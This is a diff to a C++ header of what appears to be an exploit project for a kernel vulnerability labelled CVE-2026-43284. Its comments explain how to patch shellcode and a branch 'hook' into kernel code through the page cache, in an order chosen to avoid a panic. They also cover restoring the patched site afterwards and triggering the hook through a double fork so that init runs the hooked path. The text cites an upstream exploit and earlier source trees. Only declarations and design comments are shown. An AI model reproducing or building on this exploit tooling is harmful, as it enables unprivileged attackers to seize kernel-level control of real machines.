@@ -73,14 +73,40 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         contract::AccessChannel channel = contract::AccessChannel::PageCache;
     };
 
-    /** Write the sentry hook: one word at the site -- its own block is read, the guard and the word
-     *  the payload replays are checked, the branch is patched in, the block goes back and is read
-     *  back -- and then the payload at the landing site through the same block loop every image
-     *  write uses.
+    /** Write the sentry hook in the only safe order: **the payload first**, every block written and
+     *  read back through the loop every image write uses, and **the block that carries the site
+     *  last** -- its own block is read and its guard/replayed words checked before any write, the
+     *  branch is patched into it, that block goes back and is read back.
+     *
+     *  Why that order and not the reverse: the branch is live as soon as the site word lands, so a
+     *  site written before its landing is written sends every process that reaches the sentry into
+     *  bytes that are not there yet (init's log path is one) and the kernel panics. A failure at any
+     *  step before the site write therefore returns with the site untouched.
+     *  Reference: the retired tree wrote all shellcode blocks first and the trampoline block last
+     *  (\c 6f7ded87 steps/hook_patch.cpp:176-189), and upstream does the same (exp.c:716-740).
      *  @param request the access, the parameters, the plan
      *  @param refusal receives a named reason on failure
      *  @return true when both halves are in place and verified. */
     [[nodiscard]] bool write_hook(HookRequest &request, const char **refusal) noexcept;
+
+    /** Put the site block back the way the plan found it: read the block that encloses the site, write
+     *  the guard word before the site and the displaced instruction at it, put the block back and read
+     *  it back. Nothing else is touched (the payload is left as it is; scrubbing the landing is a
+     *  separate decision, because the branch is what makes it reachable).
+     *
+     *  Idempotent by construction: it writes the plan's two words whatever the block holds now, so a
+     *  second call re-writes and re-verifies the same bytes instead of refusing "already restored".
+     *  That is what lets the chain boundary call it unconditionally on every terminus (reference: the
+     *  retired tree's unconditional restore at \c 6f7ded87 steps/chain.cpp:279-284, before release;
+     *  its \c hook_patch.cpp:210-225 puts the site block back first). Wiring it into the chain is a
+     *  later decision: this is the steps-layer step only.
+     *  @param plan the plan the hook was applied with
+     *  @param request supplies the surface and the block math: the access, the parameters, the width
+     *         and the channel (its own \c plan member is not read)
+     *  @param refusal receives a named reason when the block cannot be read, written or verified
+     *  @return true when the block is back and verified. */
+    [[nodiscard]] bool restore_hook(const hook::SentryPlan &plan, HookRequest &request,
+                                    const char **refusal) noexcept;
     /** The trigger: one double fork, so the grandchild is reparented to init and the hooked path is
      *  what runs when init reaps it. This process stays unprivileged and loads nothing.
      *  @param delay_ms how long the grandchild waits before exiting
